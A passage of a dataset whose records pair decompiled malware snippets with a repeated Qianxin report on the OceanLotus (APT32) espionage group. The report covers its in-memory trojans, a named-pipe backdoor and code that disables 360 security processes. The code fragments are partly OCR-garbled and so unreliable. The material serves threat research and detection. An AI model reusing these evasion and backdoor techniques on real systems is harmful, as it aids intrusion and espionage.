\n\n上述复杂的内存TTP似乎只是“昙花一现”，从2023年12月份新海莲花转入不活跃状态之后，我们就再也没有观察到类似的技战术，在此之后2024年3月老海莲花继承了其攻击资源又发起了两波0day供应链事件，并让我们最终确认攻击者位于UTC+7时区，海莲花通过一些渠道购买国内VPS服务器将其当作代理一直在请求目标单位的终端管理服务器并挑选要入侵的目标人员。（不止海莲花，在2024年我们观察到几乎所有方向的APT组织都在通过代理公司或者黑产四件套来购买国内VPS厂商的资源，将其当作代理和C2，甚至还有找国内人员给木马后门代签数字签名的行为，APT已经深度融入国内黑灰产上下游中，我们建议对国内下游人员进行打击，将这些通道彻底遏制）。  \n\n在UTC+8的时区下，基于天眼设备可以观察到攻击者每天从早上十点一直工作到晚上19- 20点，标准的八小时工作制，到点下班有双休，与国内红队的工作强度相比不太饱和，攻击者唯独在4月18号这一天缺勤，并且第二天“上班\"时间较晚。  \n\n![](images/9_0.jpg)\n  \n\n经过搜索发现4月18号为东南亚某国的法定节假日，称之为“雄王节”（Hung Kings/ Giõ Tô Hùng Vương）。\n\n<--- Page Split --->\n\n## 目的  \n\n目前已经确认攻击者位于东南亚国家，假设其为所在国提供情报服务。在研究其目的时，我们仅挑选终端服务器定向下发的案例来研究，因为攻击者在终端服务器上可以看到目标单位所有的组织架构和人员信息，其挑选的目标终端必然具有定向性，而其他的间谍活动比如批量入侵防火墙、web服务等都是非定向性的，无法作为研究的数据源。  \n\n我们整理了2021- 2024年间数起终端下发事件，大部分情况下其目标都聚焦在西南省份的环境和交通数据，以及我国在东亚的能源部署，这些都符合东南亚国家的利益，转折点在新海莲花出现之后，2023- 2024年大规模刺探我国能源、军工领域在中亚、中东、北亚、非洲的项目和部署情况，受害终端上甚至包含向境外派遣的人员名单，这些数据并不是东南亚小国能够消化完的，更像是域外大国关注的领域，而新海莲花组织出现的时间又恰好和东南亚某国与域外大国达成网络安全合作的时间点相吻合。  \n\n以上只是我们作为网络安全厂商所观察到的事实的陈述，不针对任何国家和个人。  \n\n## 总结  \n\n目前，基于奇安信威胁情报中心的威胁情报数据的全线产品，包括奇安信威胁情报平台（TIP）、天擎、天眼高级威胁检测系统、奇安信NGSOC、奇安信态势感知等，都已经支持对此类攻击的精确检测。  \n\n## 参考链接  \n\n[1].https://ti.qianxin.com/blog/articles/new%20-trend-in-msi-file-abuse-new-oceanlotus-group-first-to-use- mst-files-to-deliver-special-trojan-cn/  \n\n[2].https://mp.weixin.qq.com/s/3bmehaRuvaL5TnvdZXwYWA  \n\n东南亚地区APT海莲花  \n\n分享到：\n\n<--- Page Split --->", "format_code": "do{*v13++^=0xF2u;--v14;}while(v14);if((unsignedint)sub_20F1246(v20,a6,v12))", "hash_code": "c04d12f9fc6b0b94222a9dcb9bf4913ec37ca2c43ef495719cf0b593879c09cc", "hash": "hash"}
{"file_name": "0e2dd674-5079-48d3-91c0-057e4498035b_APT32.md", "title": "默认标题", "malicious_code": "v7 = kernel32_CreateThread(0, 0 × 20000, 0 × 141860, v6, 0, &i);\nkernel32_CloseHandle(v7);", "describe": "## Unknown Title  \n\n## 返回TI主页  \n\nRESEARCH  \n\n数据驱动安全  \n\n## 概述  \n\n新海莲花组织最早出现于2022年中，直到2023年底转入不活跃状态，2024年11月重新活跃并被我们快速制止披露[1]，在2023年全年新海莲花组织展示出于以往完全不同的技战术，进攻水平也比之前提升很多，使用多个0day漏洞针对我国军工、能源、航空等领域开展间谍活动，意图窃取我国能源和军工领域在中东、中亚、非洲、东亚的部署情况。  \n\n本文仅作为安全研究，我们不关注初始样本载荷，主要披露新海莲花组织内存插件和间谍目的，天擎EDR可以在内存中精准告警新海莲花组织所有内存插件，我们建议政企客户启用云查功能来发现未知威胁。  \n\n## 奇安信天擎提醒|内存攻击防护发现程序正在执行可疑内存代码，建议阻止  \n\n可疑程序：自C:\\Users\\Adminis...llCodeLoader.exe可疑来源：C:\\Windows\\System32\\cmd.exe  \n\n内存攻击是指利用Shellcode执行恶意代码  \n\n![](images/0_0.jpg)\n  \n\n不再提醒  \n\n允许  \n\n立即阻止(20)  \n\n## 内存技战术\n\n<--- Page Split --->\n\n新海莲花组织通过终端软件0day漏洞向内网特定终端下发恶意更新，实现供应链攻击，在目前国内错综复杂的安全产品生态下这种攻击模式是所有APT组织的最优解，并不是海莲花组织独有的手法[2]，我们甚至观察到针对国内的勒索软件运营商也有类似的操作，区别在于勒索运营商会向全内网终端下发勒索软件，而APT组织则是选择特定的目标终端后下发，新海莲花组织内存技战术如下：  \n\n![](images/1_0.jpg)\n  \n\n新海莲花组织在2022- 2023年所使用的CobaltStrike有一个非常明显的特征：  \n\n木马运行后会自动将当前的屏幕截图保存为PNG格式并发送到C2服务器上，如果恰好此时攻击者正处于RDP的状态，那么就能在受害者机器上得到一张攻击者双击木马程序的照片：  \n\n![](images/1_1.jpg)\n  \n\nCobalt Strike注入到系统进程后会在当前进程中内存加载Rust特马并回连新的C2，Rust特马的分析友商已经有过分析，故不再赘述。接着通过ProcessHollowing的方式将文件目录收集插件注入到系统进程中。\n\n<--- Page Split --->\n\nv9 = v24(v54, 0x80000000164, 1i64, 0i64, 3, 128, 0i64); // CreateFileW // L\"C:\\\\Users\\\\ADMINI- 1\\\\AppData\\\\Local\\\\Temp\\\\5fff4bed- 85ea- 4ba1- 8795- v10 = v27(v9, 0i64); // GetFileSize v55 = v10; if (v10) { v11 = v10; v12 = v20(0i64, v10, 12288164, 4i64); // VirtualAlloc v13 = (_BYTE \\*)v12; if (v12) { if (v26(v9, v12, v55, &v55, 0i64)) // ReadFile { v25(v9); // CloseHandle v30(v54); // DeleteFileW  \n\n将读取到的内容重新与0xF1解密后，重新进行加密。  \n\n加密算法为128位AES算法。  \n\n\\(\\begin{array}{rl} & {\\{\\\\ & {(*(\\mathrm{void}(\\_ \\mathrm{fastcall}**)(\\mathrm{char}*,\\_ \\mathrm{int64},\\_ \\mathrm{int64}))(\\mathrm{a1} + 144))(\\mathrm{v29},\\mathrm{a2},\\mathrm{16i64});//\\mathrm{memcpy}}\\\\ & {\\mathrm{if}((\\mathrm{*}(\\mathrm{unsignedint}(\\_ \\mathrm{fastcall}**)(\\mathrm{int64},\\mathrm{int}*,\\_ \\mathrm{int64},\\_ \\mathrm{QWORD},\\_ \\mathrm{DWORD},\\_ \\mathrm{int64}*)))(\\mathrm{a1} + 16))((//\\mathrm{CryptImportKey}\\\\ & {\\mathrm{v27},\\\\ & {\\mathrm{v28},\\\\ & {\\mathrm{28i64},\\\\ & {\\mathrm{0i64},\\\\ & {\\mathrm{0},\\\\ & {\\mathrm{&v26}})\\}}\\\\ & {\\mathrm{}}}\\\\ & {\\mathrm{}} \\end{array}\\)  \n\n最后将加密的内容再与0xF2异或后写入文件C:\\Programdata\\SogouInput.xml中。  \n\ndo { \\*v13++ ^= 0xF2u; - - v14; } while ( v14 ); } if ((unsigned int)sub_20F1246(v20, a6, v12)) // writefile // C:\\\\Programdata\\\\SogouInput.xml  \n\n攻击者会在后端对xml文件进行分析，最终挑选出窃取的目标文件，偷完文档后攻击者如果选择进一步横向移动，一般会通过ProcessHollowing的方式将管道特马注入到系统进程中。  \n\n## 管道特马（内存态）  \n\n该管道特马所在的内存块固定大小0x35000，创建名为\\\\\\\\.pipe\\InitStarts的管道循环监听。\n\n<--- Page Split --->\n\n\n<table><tr><td>0014113C</td><td>56</td><td>push esi</td><td></td></tr><tr><td>0014113D</td><td>52</td><td>push edx</td><td></td></tr><tr><td>0014113E</td><td>6A 03</td><td>push 0x3</td><td></td></tr><tr><td>0014114D</td><td>68 90471500</td><td>push 0x154790</td><td>UNICODE \"\\\\.\\pipe\\InitStarts&quot;</td></tr><tr><td>00141145</td><td>FF15 08E01400</td><td>call dword ptr ds:[0x14E008]</td><td>kernel32.CreateNamedPipeW</td></tr><tr><td>0014114B</td><td>8BF0</td><td>mov esi,eax</td><td></td></tr><tr><td>0014114D</td><td>85F6</td><td>test esi,esi</td><td></td></tr><tr><td>0014114F</td><td>74 10</td><td>test short 00141161</td><td></td></tr><tr><td>00141151</td><td>6A 00</td><td>push 0x0</td><td></td></tr><tr><td>00141153</td><td>56</td><td>push esi</td><td></td></tr><tr><td>00141154</td><td>FF15 0CE01400</td><td>call dword ptr ds:[0x14E00C]</td><td>kernel32.ConnectNamedPipe</td></tr><tr><td>0014115A</td><td>85C0</td><td>test eax,eax</td><td></td></tr><tr><td>0014115C</td><td>75 15</td><td>int short 00141173</td><td></td></tr><tr><td>0014115E</td><td>56</td><td>push esi</td><td></td></tr><tr><td>0014115F</td><td>FFD3</td><td>call ebx</td><td>kernel32.CloseHandle</td></tr><tr><td>00141161</td><td>57</td><td>push edi</td><td></td></tr><tr><td>00141162</td><td>FF15 14E01400</td><td>call dword ptr ds:[0x14E014]</td><td>kernel32.Sleep</td></tr></table>  \n\n读取管道中的数据：  \n\n![](images/3_0.jpg)\n  \n\n通信过程中定义了一个结构体，创建线程并将结构体当作参数传入。\n\n<--- Page Split --->\n\n\\(\\begin{array}{rl} & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{v}6 + 308) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 312) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{OR} *)(\\mathrm{V}6 + 316) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 320) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{OR} *)(\\mathrm{V}6 + 324) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 328) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{OR} *)(\\mathrm{V}6 + 8) = \\boxed {\\mathrm{V}};}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)\\mathrm{v}6 = 1;}\\\\ & {\\mathrm{kernel}32\\_ \\mathrm{InterlockedIncrement}(\\mathrm{v}9);}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 4) = \\mathrm{v}15;}\\\\ & {\\mathrm{ntdl}1\\_ \\mathrm{Rt} \\mathrm{InitializeCriticalSection}(\\mathrm{v}6 + 12);}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 300) = \\emptyset \\times 40000;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 304) = 11 * \\mathrm{kernel}32\\_ \\mathrm{GetCurrentProcessId}();}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 304) = 11 * \\mathrm{kernel}32\\_ \\mathrm{GetCurrentThreadId}();}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 304) + = \\mathrm{kernel}32\\_ \\mathrm{GetTickCount}();}\\\\ & {*(\\_ \\mathrm{BYTE} *)(\\mathrm{V}6 + 296) = 1;}\\\\ & {\\mathrm{kernel}32\\_ \\mathrm{InterlockedIncrement}(\\mathrm{v}6);}\\\\ & {\\mathrm{i} = \\emptyset ;}\\\\ & {\\mathrm{v}7 = \\mathrm{kernel}32\\_ \\mathrm{CreateThread}(\\emptyset , \\emptyset \\times 20000, \\emptyset \\times 141860, \\mathrm{v}6, \\emptyset , \\& \\mathrm{i});}\\\\ & {\\mathrm{if} (\\mathrm{v}7)}\\\\ & {\\{\\\\ & \\mathrm{kernel}32\\_ \\mathrm{CloseHandle}(\\mathrm{v}7);}\\\\ & {\\mathrm{return} \\mathrm{v}6;}\\\\ & {\\}}\\\\ & {\\mathrm{else}} \\end{array}\\)  \n\n该线程会持续读取管道中的数据，并将数据解密后传递给工作线程，同时获取工作线程执行后的数据再解密传输到管道中。  \n\n2 3 4 5 6 7 8 9 10 11 12  \n\n加密算法如下：\n\n<--- Page Split --->\n\nv4 = \\*(_DWORD \\*) (this + 300);v23 = 0;v24 = 0;v5 = (v3 \\* v3 \\* v3 + 18) % 0xB8A5u;v6 = (unsigned __int8)v5;*(_DWORD \\*) (this + 304) = v5;v26 = 0;v27 = 0;v25 = (unsigned __int8)v5;sub_141D40(&v22, 0, (int)&v25, (int)v28, (int)v21);ntdll_RtlEnterCriticalSection(this + 12);v7 = \\*(char \\*\\*) (this + 320);v8 = \\*(_DWORD \\*) (this + 324) - (_DWORD)v7;v29 = v7;if (v4 <= v8)v8 = v4;v25 = v6 ^ v8 ^ 0x2B48;v26 = (v6 ^ v8 ^ 0x6C502B48) >> 16;v27 = (v6 ^ v8 ^ 0x6C502B48) >> 24;sub_141D40(&v22, v23, (int)&v25, (int)v28, (int)v7);if (v8){sub_141D40(&v22, v23, (int)v29, (int)&v29[v8], (int)v29);v9 = v30;v10 = \\*(_DWORD \\*) (v30 + 320);v11 = v8 + v10;if (v10 != v8 + v10){v12 = \\*(_DWORD \\*) (v30 + 324) - v11;sub_145290(v10, v11, v12);\\*(_DWORD \\*) (v9 + 324) = v12 + v10;  \n\n工作线程中有大量的功能性函数，例如：文件管理、shellcode加载、命令执行等。\n\n<--- Page Split --->\n\n密码为弱口令，可以推测攻击者是通过爆破的方式获取到服务器密码。  \n\n![](images/6_0.jpg)\n  \n\n通过 history 日志可以确认攻击者在浏览服务器上的目录并打包数据。  \n\n## 双平台特马（内存态）  \n\n新海莲花组织在入侵边界服务器时如：web 服务器、防火墙等设备会使用一款 Win | linux 双平台的特马，该特马最早在防火墙上被发现，很长一段时间内我们认为该特马只在边界服务器上部署，但是在一次对抗的过程中发现该特马被注入到 windows 的系统进程中，并且注入时间距离 Cobalt Strike 的植入时间晚一周。\n\n<--- Page Split --->\n\nHANDLE v0; // eaxCHAR String1[272]; // [esp+1Ch] [ebp- 110h] BYREF  \n\nmemset(String1, 0, 0x104u);v0 = GetCurrentProcess();GetModuleBaseNameA(v0, 0, String1, 260);return lstrcmpA(String1, \"360Baobiao.exe\") == 0;  \n\nDLL的主要功能通过DeviceIOctontol关闭自保。\n\n<--- Page Split --->\n\nhDevice = hObject; \n\nif (!hObject) \n\n{ v1 = sub_6BAC1530(); \n\nif (!v1) return v1; \n\nBytesReturned = 0; InBuffer[0] = 0; \n\nv1 = DeviceIoControl(hDevic if (!v1) \n\nCloseHandle(hObject); hObject = 0; \n\n之后休眠 zhudongfangyu.exe 和 360rps.exe 进程，实现致盲的效果。\n\n<--- Page Split --->\n\n41 } while（v3！ \\(= \\vee 4\\) ）; 43 1 if（lstrcmpw(L\"ZHUDONGFANGYU.EXE\",pe.szExeFile)&&lstrcmpw(L\"36ORPS.EXE\",pe.szExeFile)） 45 1 if（!lstrcmpw(\"3\",pe.szExeFile) 47 1!lstrcmpw(&word_6BAC4102,pe.szExeFile) 48 1!lstrcmpw(&word_6BAC4116,pe.szExeFile)） 49 1 v12[v10++]=pe.th32ProcessID; 50 1 51 52 1 else 53 1 v11[v1++]=pe.th32ProcessID; 54 1 55 1 56 1 57 1 while（Process32NextW(v9,&pe）); 58 CloseHandle(v9); 59 if（v1） 60 1 61 { 62 v6=0; 63 while（sub_6BAC16C0(v11[v6])） 64 { 65 if（++v6==v1）  \n\n目前该手法已经无效。  \n\n## UTC+7  \n\n上述复杂的内存TTP似乎只是“昙花一现”，从2023年12月份新海莲花转入不活跃状态之后，我们就再也没有观察到类似的技战术，在此之后2024年3月老海莲花继承了其攻击资源又发起了两波0day供应链事件，并让我们最终确认攻击者位于UTC+7时区，海莲花通过一些渠道购买国内VPS服务器将其当作代理一直在请求目标单位的终端管理服务器并挑选要入侵的目标人员。（不止海莲花，在2024年我们观察到几乎所有方向的APT组织都在通过代理公司或者黑产四件套来购买国内VPS厂商的资源，将其当作代理和C2，甚至还有找国内人员给木马后门代签数字签名的行为，APT已经深度融入国内黑灰产上下游中，我们建议对国内下游人员进行打击，将这些通道彻底遏制）。  \n\n在UTC+8的时区下，基于天眼设备可以观察到攻击者每天从早上十点一直工作到晚上19- 20点，标准的八小时工作制，到点下班有双休，与国内红队的工作强度相比不太饱和，攻击者唯独在4月18号这一天缺勤，并且第二天“上班\"时间较晚。  \n\n![](images/9_0.jpg)\n  \n\n经过搜索发现4月18号为东南亚某国的法定节假日，称之为“雄王节”（Hung Kings/ Giõ Tô Hùng Vương）。\n\n<--- Page Split --->\n\n## 目的  \n\n目前已经确认攻击者位于东南亚国家，假设其为所在国提供情报服务。在研究其目的时，我们仅挑选终端服务器定向下发的案例来研究，因为攻击者在终端服务器上可以看到目标单位所有的组织架构和人员信息，其挑选的目标终端必然具有定向性，而其他的间谍活动比如批量入侵防火墙、web服务等都是非定向性的，无法作为研究的数据源。  \n\n我们整理了2021- 2024年间数起终端下发事件，大部分情况下其目标都聚焦在西南省份的环境和交通数据，以及我国在东亚的能源部署，这些都符合东南亚国家的利益，转折点在新海莲花出现之后，2023- 2024年大规模刺探我国能源、军工领域在中亚、中东、北亚、非洲的项目和部署情况，受害终端上甚至包含向境外派遣的人员名单，这些数据并不是东南亚小国能够消化完的，更像是域外大国关注的领域，而新海莲花组织出现的时间又恰好和东南亚某国与域外大国达成网络安全合作的时间点相吻合。  \n\n以上只是我们作为网络安全厂商所观察到的事实的陈述，不针对任何国家和个人。  \n\n## 总结  \n\n目前，基于奇安信威胁情报中心的威胁情报数据的全线产品，包括奇安信威胁情报平台（TIP）、天擎、天眼高级威胁检测系统、奇安信NGSOC、奇安信态势感知等，都已经支持对此类攻击的精确检测。  \n\n## 参考链接  \n\n[1].https://ti.qianxin.com/blog/articles/new%20-trend-in-msi-file-abuse-new-oceanlotus-group-first-to-use- mst-files-to-deliver-special-trojan-cn/  \n\n[2].https://mp.weixin.qq.com/s/3bmehaRuvaL5TnvdZXwYWA  \n\n东南亚地区APT海莲花  \n\n分享到：\n\n<--- Page Split --->", "format_code": "v7=kernel32_CreateThread(0,0×20000,0×141860,v6,0,&i);kernel32_CloseHandle(v7);", "hash_code": "bec9285534e55a20a2f4893ad279ed6cfa0f5be6cccf476b92a73205f388a26d", "hash": "hash"}
{"file_name": "0e2dd674-5079-48d3-91c0-057e4498035b_APT32.md", "title": "默认标题", "malicious_code": "v25 = v6 ^ v8 ^ 0x2B48;\nv26 = (v6 ^ v8 ^ 0x6C502B48) >> 16;\nv27 = (v6 ^ v8 ^ 0x6C502B48) >> 24;\nsub_141D40(&v22, v23, (int)&v25, (int)v28, (int)v7);\nif (v8){\nsub_141D40(&v22, v23, (int)v29, (int)&v29[v8], (int)v29);\nv9 = v30;\nv10 = *(_DWORD *) (v30 + 320);\nv11 = v8 + v10;\nif (v10 != v8 + v10){\nv12 = *(_DWORD *) (v30 + 324) - v11;\nsub_145290(v10, v11, v12);\n*(DWORD *) (v9 + 324) = v12 + v10;", "describe": "## Unknown Title  \n\n## 返回TI主页  \n\nRESEARCH  \n\n数据驱动安全  \n\n## 概述  \n\n新海莲花组织最早出现于2022年中，直到2023年底转入不活跃状态，2024年11月重新活跃并被我们快速制止披露[1]，在2023年全年新海莲花组织展示出于以往完全不同的技战术，进攻水平也比之前提升很多，使用多个0day漏洞针对我国军工、能源、航空等领域开展间谍活动，意图窃取我国能源和军工领域在中东、中亚、非洲、东亚的部署情况。  \n\n本文仅作为安全研究，我们不关注初始样本载荷，主要披露新海莲花组织内存插件和间谍目的，天擎EDR可以在内存中精准告警新海莲花组织所有内存插件，我们建议政企客户启用云查功能来发现未知威胁。  \n\n## 奇安信天擎提醒|内存攻击防护发现程序正在执行可疑内存代码，建议阻止  \n\n可疑程序：自C:\\Users\\Adminis...llCodeLoader.exe可疑来源：C:\\Windows\\System32\\cmd.exe  \n\n内存攻击是指利用Shellcode执行恶意代码  \n\n![](images/0_0.jpg)\n  \n\n不再提醒  \n\n允许  \n\n立即阻止(20)  \n\n## 内存技战术\n\n<--- Page Split --->\n\n新海莲花组织通过终端软件0day漏洞向内网特定终端下发恶意更新，实现供应链攻击，在目前国内错综复杂的安全产品生态下这种攻击模式是所有APT组织的最优解，并不是海莲花组织独有的手法[2]，我们甚至观察到针对国内的勒索软件运营商也有类似的操作，区别在于勒索运营商会向全内网终端下发勒索软件，而APT组织则是选择特定的目标终端后下发，新海莲花组织内存技战术如下：  \n\n![](images/1_0.jpg)\n  \n\n新海莲花组织在2022- 2023年所使用的CobaltStrike有一个非常明显的特征：  \n\n木马运行后会自动将当前的屏幕截图保存为PNG格式并发送到C2服务器上，如果恰好此时攻击者正处于RDP的状态，那么就能在受害者机器上得到一张攻击者双击木马程序的照片：  \n\n![](images/1_1.jpg)\n  \n\nCobalt Strike注入到系统进程后会在当前进程中内存加载Rust特马并回连新的C2，Rust特马的分析友商已经有过分析，故不再赘述。接着通过ProcessHollowing的方式将文件目录收集插件注入到系统进程中。\n\n<--- Page Split --->\n\nv9 = v24(v54, 0x80000000164, 1i64, 0i64, 3, 128, 0i64); // CreateFileW // L\"C:\\\\Users\\\\ADMINI- 1\\\\AppData\\\\Local\\\\Temp\\\\5fff4bed- 85ea- 4ba1- 8795- v10 = v27(v9, 0i64); // GetFileSize v55 = v10; if (v10) { v11 = v10; v12 = v20(0i64, v10, 12288164, 4i64); // VirtualAlloc v13 = (_BYTE \\*)v12; if (v12) { if (v26(v9, v12, v55, &v55, 0i64)) // ReadFile { v25(v9); // CloseHandle v30(v54); // DeleteFileW  \n\n将读取到的内容重新与0xF1解密后，重新进行加密。  \n\n加密算法为128位AES算法。  \n\n\\(\\begin{array}{rl} & {\\{\\\\ & {(*(\\mathrm{void}(\\_ \\mathrm{fastcall}**)(\\mathrm{char}*,\\_ \\mathrm{int64},\\_ \\mathrm{int64}))(\\mathrm{a1} + 144))(\\mathrm{v29},\\mathrm{a2},\\mathrm{16i64});//\\mathrm{memcpy}}\\\\ & {\\mathrm{if}((\\mathrm{*}(\\mathrm{unsignedint}(\\_ \\mathrm{fastcall}**)(\\mathrm{int64},\\mathrm{int}*,\\_ \\mathrm{int64},\\_ \\mathrm{QWORD},\\_ \\mathrm{DWORD},\\_ \\mathrm{int64}*)))(\\mathrm{a1} + 16))((//\\mathrm{CryptImportKey}\\\\ & {\\mathrm{v27},\\\\ & {\\mathrm{v28},\\\\ & {\\mathrm{28i64},\\\\ & {\\mathrm{0i64},\\\\ & {\\mathrm{0},\\\\ & {\\mathrm{&v26}})\\}}\\\\ & {\\mathrm{}}}\\\\ & {\\mathrm{}} \\end{array}\\)  \n\n最后将加密的内容再与0xF2异或后写入文件C:\\Programdata\\SogouInput.xml中。  \n\ndo { \\*v13++ ^= 0xF2u; - - v14; } while ( v14 ); } if ((unsigned int)sub_20F1246(v20, a6, v12)) // writefile // C:\\\\Programdata\\\\SogouInput.xml  \n\n攻击者会在后端对xml文件进行分析，最终挑选出窃取的目标文件，偷完文档后攻击者如果选择进一步横向移动，一般会通过ProcessHollowing的方式将管道特马注入到系统进程中。  \n\n## 管道特马（内存态）  \n\n该管道特马所在的内存块固定大小0x35000，创建名为\\\\\\\\.pipe\\InitStarts的管道循环监听。\n\n<--- Page Split --->\n\n\n<table><tr><td>0014113C</td><td>56</td><td>push esi</td><td></td></tr><tr><td>0014113D</td><td>52</td><td>push edx</td><td></td></tr><tr><td>0014113E</td><td>6A 03</td><td>push 0x3</td><td></td></tr><tr><td>0014114D</td><td>68 90471500</td><td>push 0x154790</td><td>UNICODE \"\\\\.\\pipe\\InitStarts&quot;</td></tr><tr><td>00141145</td><td>FF15 08E01400</td><td>call dword ptr ds:[0x14E008]</td><td>kernel32.CreateNamedPipeW</td></tr><tr><td>0014114B</td><td>8BF0</td><td>mov esi,eax</td><td></td></tr><tr><td>0014114D</td><td>85F6</td><td>test esi,esi</td><td></td></tr><tr><td>0014114F</td><td>74 10</td><td>test short 00141161</td><td></td></tr><tr><td>00141151</td><td>6A 00</td><td>push 0x0</td><td></td></tr><tr><td>00141153</td><td>56</td><td>push esi</td><td></td></tr><tr><td>00141154</td><td>FF15 0CE01400</td><td>call dword ptr ds:[0x14E00C]</td><td>kernel32.ConnectNamedPipe</td></tr><tr><td>0014115A</td><td>85C0</td><td>test eax,eax</td><td></td></tr><tr><td>0014115C</td><td>75 15</td><td>int short 00141173</td><td></td></tr><tr><td>0014115E</td><td>56</td><td>push esi</td><td></td></tr><tr><td>0014115F</td><td>FFD3</td><td>call ebx</td><td>kernel32.CloseHandle</td></tr><tr><td>00141161</td><td>57</td><td>push edi</td><td></td></tr><tr><td>00141162</td><td>FF15 14E01400</td><td>call dword ptr ds:[0x14E014]</td><td>kernel32.Sleep</td></tr></table>  \n\n读取管道中的数据：  \n\n![](images/3_0.jpg)\n  \n\n通信过程中定义了一个结构体，创建线程并将结构体当作参数传入。\n\n<--- Page Split --->\n\n\\(\\begin{array}{rl} & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{v}6 + 308) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 312) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{OR} *)(\\mathrm{V}6 + 316) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 320) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{OR} *)(\\mathrm{V}6 + 324) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 328) = \\emptyset ;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{OR} *)(\\mathrm{V}6 + 8) = \\boxed {\\mathrm{V}};}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)\\mathrm{v}6 = 1;}\\\\ & {\\mathrm{kernel}32\\_ \\mathrm{InterlockedIncrement}(\\mathrm{v}9);}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 4) = \\mathrm{v}15;}\\\\ & {\\mathrm{ntdl}1\\_ \\mathrm{Rt} \\mathrm{InitializeCriticalSection}(\\mathrm{v}6 + 12);}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 300) = \\emptyset \\times 40000;}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 304) = 11 * \\mathrm{kernel}32\\_ \\mathrm{GetCurrentProcessId}();}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 304) = 11 * \\mathrm{kernel}32\\_ \\mathrm{GetCurrentThreadId}();}\\\\ & {*(\\_ \\mathrm{DW} \\mathrm{ORD} *)(\\mathrm{V}6 + 304) + = \\mathrm{kernel}32\\_ \\mathrm{GetTickCount}();}\\\\ & {*(\\_ \\mathrm{BYTE} *)(\\mathrm{V}6 + 296) = 1;}\\\\ & {\\mathrm{kernel}32\\_ \\mathrm{InterlockedIncrement}(\\mathrm{v}6);}\\\\ & {\\mathrm{i} = \\emptyset ;}\\\\ & {\\mathrm{v}7 = \\mathrm{kernel}32\\_ \\mathrm{CreateThread}(\\emptyset , \\emptyset \\times 20000, \\emptyset \\times 141860, \\mathrm{v}6, \\emptyset , \\& \\mathrm{i});}\\\\ & {\\mathrm{if} (\\mathrm{v}7)}\\\\ & {\\{\\\\ & \\mathrm{kernel}32\\_ \\mathrm{CloseHandle}(\\mathrm{v}7);}\\\\ & {\\mathrm{return} \\mathrm{v}6;}\\\\ & {\\}}\\\\ & {\\mathrm{else}} \\end{array}\\)  \n\n该线程会持续读取管道中的数据，并将数据解密后传递给工作线程，同时获取工作线程执行后的数据再解密传输到管道中。  \n\n2 3 4 5 6 7 8 9 10 11 12  \n\n加密算法如下：\n\n<--- Page Split --->\n\nv4 = \\*(_DWORD \\*) (this + 300);v23 = 0;v24 = 0;v5 = (v3 \\* v3 \\* v3 + 18) % 0xB8A5u;v6 = (unsigned __int8)v5;*(_DWORD \\*) (this + 304) = v5;v26 = 0;v27 = 0;v25 = (unsigned __int8)v5;sub_141D40(&v22, 0, (int)&v25, (int)v28, (int)v21);ntdll_RtlEnterCriticalSection(this + 12);v7 = \\*(char \\*\\*) (this + 320);v8 = \\*(_DWORD \\*) (this + 324) - (_DWORD)v7;v29 = v7;if (v4 <= v8)v8 = v4;v25 = v6 ^ v8 ^ 0x2B48;v26 = (v6 ^ v8 ^ 0x6C502B48) >> 16;v27 = (v6 ^ v8 ^ 0x6C502B48) >> 24;sub_141D40(&v22, v23, (int)&v25, (int)v28, (int)v7);if (v8){sub_141D40(&v22, v23, (int)v29, (int)&v29[v8], (int)v29);v9 = v30;v10 = \\*(_DWORD \\*) (v30 + 320);v11 = v8 + v10;if (v10 != v8 + v10){v12 = \\*(_DWORD \\*) (v30 + 324) - v11;sub_145290(v10, v11, v12);\\*(_DWORD \\*) (v9 + 324) = v12 + v10;  \n\n工作线程中有大量的功能性函数，例如：文件管理、shellcode加载、命令执行等。\n\n<--- Page Split --->\n\n密码为弱口令，可以推测攻击者是通过爆破的方式获取到服务器密码。  \n\n![](images/6_0.jpg)\n  \n\n通过 history 日志可以确认攻击者在浏览服务器上的目录并打包数据。  \n\n## 双平台特马（内存态）  \n\n新海莲花组织在入侵边界服务器时如：web 服务器、防火墙等设备会使用一款 Win | linux 双平台的特马，该特马最早在防火墙上被发现，很长一段时间内我们认为该特马只在边界服务器上部署，但是在一次对抗的过程中发现该特马被注入到 windows 的系统进程中，并且注入时间距离 Cobalt Strike 的植入时间晚一周。\n\n<--- Page Split --->\n\nHANDLE v0; // eaxCHAR String1[272]; // [esp+1Ch] [ebp- 110h] BYREF  \n\nmemset(String1, 0, 0x104u);v0 = 